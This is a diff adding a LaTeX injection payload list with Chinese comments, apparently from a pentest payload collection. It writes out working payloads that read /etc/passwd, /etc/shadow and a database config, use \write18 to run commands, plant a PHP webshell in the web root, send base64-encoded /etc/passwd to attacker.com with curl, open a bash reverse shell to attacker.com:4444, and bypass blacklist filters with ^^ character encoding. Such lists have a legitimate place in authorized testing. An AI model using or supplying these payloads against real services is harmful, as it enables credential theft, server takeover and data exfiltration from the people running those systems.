@@ -1,0 +1,20 @@
+# LaTeX - \input 读取 /etc/passwd 泄露系统用户列表
+\input{/etc/passwd}
+# LaTeX - \include 包含任意 .tex 文件泄露敏感配置
+\include{/var/www/html/config/database}
+# LaTeX - \lstinputlisting 逐行读取 /etc/shadow 泄露密码哈希
+\lstinputlisting{/etc/shadow}
+# LaTeX - \verbatiminput 原始读取 /etc/passwd 不做解释
+\verbatiminput{/etc/passwd}
+# LaTeX - 逐行循环读取多行敏感文件 (/etc/shadow)
+\newread\file\openin\file=/etc/shadow\loop\unless\ifeof\file\read\file to\line\text{\line}\repeat\closein\file
+# LaTeX - \immediate\write18 执行 id 命令确认代码执行能力
+\immediate\write18{id}
+# LaTeX - \immediate\write18 写入 Webshell 到 Web 目录 Getshell
+\immediate\write18{echo '<?php system(\$_GET[1]);?>' > /var/www/html/latex.php}
+# LaTeX - \immediate\write18 curl 数据外带泄露到攻击者服务器
+\immediate\write18{curl http://attacker.com/$(cat /etc/passwd|base64)}
+# LaTeX - \immediate\write18 反弹 Shell (bash TCP)
+\immediate\write18{bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'}
+# LaTeX - ^^ 字符编码绕过黑名单过滤读取 /etc/passwd
+\lstin^^70utlisting{/etc/passwd}
